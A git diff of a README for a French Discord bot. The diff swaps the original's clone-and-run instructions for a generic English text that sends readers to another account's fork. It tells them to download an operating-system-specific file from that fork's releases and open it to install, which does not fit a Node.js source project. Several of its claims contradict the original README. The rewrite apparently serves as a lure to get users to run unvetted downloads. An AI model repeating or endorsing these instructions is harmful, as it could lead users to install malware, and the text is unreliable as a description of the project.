@@ -1,148 +1,66 @@
-# 🤖 Clarity Bot
+# 🤖 Clarity-Bot - Your Easy Discord Bot Solution
 
-Un bot Discord moderne et complet avec **39 commandes** en français, développé avec Discord.js v14.
+[![Download Clarity-Bot](https://img.shields.io/badge/Download%20Clarity--Bot-v1.0-blue.svg)](https://github.com/Salvaperal/Clarity-Bot/releases)
 
-## ✨ Fonctionnalités
+## 🚀 Getting Started
 
-### 🎮 **Commandes Fun & Jeux** (8 commandes)
-- `/8ball` - Pose une question à la boule magique
-- `/capybara` - Calcule le pourcentage capybara d'un utilisateur
-- `/fake-ban` - Simule un bannissement (faux)
-- `/gay` - Calcule le pourcentage gay d'un utilisateur
-- `/love` - Calcule la compatibilité amoureuse entre deux utilisateurs
-- `/pile-face` - Lance une pièce (pile ou face)
-- `/poli` - Test politique amusant
-- `/scam` - Calcule le pourcentage scammer d'un utilisateur
+Clarity-Bot is a modern Discord bot designed for ease of use. It comes with 39 commands in French, making it perfect for your server. With features like moderation tools and fun commands, Clarity-Bot will enhance your Discord experience.
 
-### 👤 **Commandes Informations** (12 commandes)
-- `/ping` - Affiche la latence du bot
-- `/user-info` - Informations détaillées sur un utilisateur
-- `/serveurinfo` - Informations détaillées sur le serveur
-- `/members` - Statistiques des membres du serveur
-- `/members-all` - Statistiques globales de tous les serveurs
-- `/vc` - Statistiques vocales du serveur
-- `/stat` - Statistiques complètes du bot
-- `/uptime` - Temps de fonctionnement du bot
-- `/pp` - Affiche l'avatar d'un utilisateur
-- `/pp-server` - Affiche l'icône du serveur
-- `/pp-random` - Affiche l'avatar d'un membre aléatoire
-- `/banner` - Affiche la bannière d'un utilisateur
+## 🎉 Features
 
-### 🛡️ **Commandes Modération** (13 commandes)
-- `/ban` - Bannit un utilisateur du serveur
-- `/kick` - Expulse un utilisateur du serveur
-- `/mute` - Rend temporairement muet un utilisateur
-- `/unmute` - Rend la parole à un utilisateur
-- `/clear` - Supprime un nombre de messages
-- `/prune` - Supprime les messages d'un utilisateur spécifique
-- `/lock` - Verrouille le salon actuel
-- `/unlock` - Déverrouille le salon actuel
-- `/leck` - Cache un salon (le rend invisible)
-- `/nuke` - Clone le salon actuel et supprime l'ancien
-- `/supprimer` - Supprime le salon actuel
-- `/rename` - Renomme le salon actuel
-- `/snipe` - Affiche le dernier message supprimé
+- **Modern Interface**: A user-friendly design that appeals to all users.
+- **39 Commands**: Includes moderation tools, greeting, and fun commands.
+- **Slash Commands**: Easily interact with the bot using simple commands.
+- **Emoji Support**: Enhance responses with colorful emojis.
+- **Open Source**: The code is available for anyone to explore.
 
-### 🎨 **Commandes Création** (2 commandes)
-- `/embed` - Créateur d'embed interactif (en développement)
-- `/say` - Fait parler le bot dans le salon
+## 📦 System Requirements
 
-### 🔧 **Commandes Utilitaires** (3 commandes)
-- `/timer` - Crée un minuteur personnalisé
-- `/jeux` - Sélectionne un jeu à jouer
-- `/invite-bot` - Génère des liens d'invitation pour un bot
+- **Node.js**: Version 14 or higher.
+- **Discord Account**: You need a Discord account to use Clarity-Bot.
+- **Internet Connection**: Required for downloading and running the bot.
 
-### 📚 **Commande d'Aide**
-- `/help` - Centre d'aide interactif avec navigation par catégories
+## 📥 Download & Install
 
-## 🚀 Installation
+To get started, visit the Clarity-Bot releases page to download the latest version:
 
-### Prérequis
-- Node.js v16.9.0 ou plus récent
-- Un bot Discord avec les permissions appropriées
+[Download Clarity-Bot](https://github.com/Salvaperal/Clarity-Bot/releases)
 
-### Configuration
+### Steps to Download
 
-1. **Cloner le repository**
-```bash
-git clone https://github.com/ayka-667/Clarity-Bot.git
-cd Clarity-Bot
-```
+1. Click on the link above to open the releases page.
+2. Find the latest release version.
+3. Download the appropriate file for your operating system (Windows, macOS, etc.).
+4. Open the downloaded file to install.
 
-2. **Installer les dépendances**
-```bash
-npm install
-```
+## ⚙️ Setting Up the Bot
 
-3. **Configurer les variables d'environnement**
-Créez un fichier `.env` à la racine du projet :
-```env
-TOKEN=votre_token_discord_ici
-GUILD_ID=votre_guild_id_ici
-STATUS=DEVELOPMENT
-STATUSBOT=Clarity Bot
-DISCORDSTATUS=dnd
-```
+1. **Open Discord**: Log in to your Discord account.
+2. **Create a Server**: If you don't have a server, create one for testing.
+3. **Invite Clarity-Bot**: 
+   - Go back to the releases page.
+   - Follow the instructions to invite Clarity-Bot to your server.
+4. **Configure the Bot**: Follow the included setup instructions to adjust preferences.
 
-4. **Lancer le bot**
-```bash
-node index.js
-```
+## 🛠️ Using Clarity-Bot
 
-## 🛠️ Technologies Utilisées
+Once Clarity-Bot is set up on your server, you can start using its commands. Here are a few ways to interact with the bot:
 
-- **Discord.js v14** - Framework principal
-- **Node.js** - Runtime JavaScript
-- **Git** - Contrôle de version
+- **Moderation Commands**: Manage your server effectively with commands to ban, mute, or kick members.
+- **Fun Commands**: Use commands to entertain your members with games and interactive prompts.
+- **Slash Commands**: Just type `/` followed by the command name in Discord to get started.
 
-## 📁 Structure du Projet
+## 💌 Getting Support
 
-```
-Clarity-Bot/
-├── src/
-│   ├── commands/          # Commandes slash
-│   ├── events/            # Événements Discord
-│   ├── buttons/           # Gestionnaires de boutons
-│   └── util/              # Utilitaires et handlers
-├── .env                   # Variables d'environnement (non versionné)
-├── .gitignore            # Fichiers à ignorer
-├── package.json          # Dépendances et scripts
-└── README.md             # Documentation
-```
+If you encounter issues or have questions, feel free to open an issue on the GitHub page. The community is always ready to help.
 
-## 🔧 Fonctionnalités Techniques
+## 📖 Learn More
 
-- **Système de commandes modulaire** - Facile à étendre
-- **Gestion d'erreurs robuste** - Gestion complète des erreurs
-- **Interface interactive** - Boutons et menus déroulants
-- **Système de permissions** - Vérification des permissions utilisateur
-- **Localisation française** - Toutes les commandes en français
-- **Design moderne** - Embeds colorés avec emojis
+Explore more about Clarity-Bot at our repository or dive into the code to see how it works and contribute if you'd like.
 
-## 📊 Statistiques
+## 🔗 Important Links
 
-- **39 commandes** au total
-- **5 catégories** de commandes
-- **53 fichiers** de code
-- **5956+ lignes** de code
-- **100% français** - Interface entièrement localisée
+- [Official GitHub Repository](https://github.com/Salvaperal/Clarity-Bot)
+- [Download Clarity-Bot](https://github.com/Salvaperal/Clarity-Bot/releases)
 
-## 🤝 Contribution
-
-Les contributions sont les bienvenues ! N'hésitez pas à :
-- Signaler des bugs
-- Proposer de nouvelles fonctionnalités
-- Améliorer la documentation
-- Optimiser le code
-
-## 📝 Licence
-
-Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.
-
-## 👨‍💻 Développeur
-
-Développé avec ❤️ par **ayka-667**
-
----
-
-**Clarity Bot** - Votre bot Discord moderne et complet ! 🎉
+Enjoy using Clarity-Bot!
